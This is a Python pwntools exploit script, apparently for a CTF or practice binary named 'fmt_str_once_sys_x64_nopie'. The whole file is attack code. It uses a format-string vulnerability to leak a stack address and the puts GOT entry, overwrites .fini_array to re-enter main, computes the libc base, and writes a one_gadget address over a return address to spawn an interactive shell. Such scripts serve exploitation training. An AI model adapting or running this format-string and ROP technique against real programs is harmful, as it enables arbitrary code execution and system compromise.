#!/usr/bin/env python
# coding=utf-8
from pwn import *
import duchao_pwn_script
arch = 'amd64'
duchao_pwn_script.init_pwn_linux(arch)
pwnfile= './fmt_str_once_sys_x64_nopie'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc =elf.libc


dem = 'input:\n'
io.recvuntil(dem)
payload = b"%40$p%16$s"
align_len = 16
len_a = align_len - len(payload)
payload = payload.ljust(align_len,b"a")
fini_array = 0x4031D0
main_adrr = elf.symbols["main"]
printf_got = elf.got["printf"]
puts_got = elf.got["puts"]
pop_rdi_ret = 0x401363
# system_plt = elf.symbols["system"]
duchao_pwn_script.dbg(io)
numb_written = 14 + 6 + len_a
payload += fmtstr_payload(8, {fini_array :main_adrr} , numbwritten = numb_written)
payload += p64(puts_got)
print(payload)
io.send(payload)
io.recvuntil(b"0x")
rbp_1 = int(io.recv(12),16)
old_rbp = rbp_1 - 0x10
new_rbp = old_rbp - 0xe0
puts_addr = u64(io.recv(6).ljust(8,b"\x00"))
sys_addr ,binsh_addr = duchao_pwn_script.libcsearch_sys_sh("puts" , puts_addr , path = libc.path)
libc_base = sys_addr - libc.symbols["system"]
one_gadgat = libc_base + 0xe6c7e
print("old_rbp is :" , hex(old_rbp))
print("new_rbp is :" , hex(new_rbp))
print("sys_addr is :" , hex(sys_addr))
print("binsh_addr is :" , hex(binsh_addr))

# payload = fmtstr_payload(6, {new_rbp + 0x8 :pop_rdi_ret , new_rbp+0x10:binsh_addr , new_rbp+0x18:sys_addr})
payload = fmtstr_payload(6, {new_rbp + 0x8 :one_gadgat })
# payload = b"aaaaaaaa"
io.sendafter(dem,payload)
io.interactive()
